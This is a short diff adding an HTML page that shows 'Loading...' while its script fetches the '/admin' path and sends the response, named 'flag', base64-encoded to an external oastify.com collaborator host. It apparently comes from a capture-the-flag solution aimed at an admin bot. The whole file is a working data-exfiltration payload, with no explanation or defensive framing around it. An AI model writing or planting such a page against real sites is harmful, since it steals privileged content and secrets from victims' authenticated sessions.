@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Loading...</h1>
+    <script>
+      fetch('/admin')
+        .then(r => r.text())
+        .then(flag => {
+          fetch('https://upnfh4s44mg9ztrortgf6rudy44vsmka9.oastify.com/?flag=' + btoa(flag));
+        });
+    </script>
+  </body>
+</html>
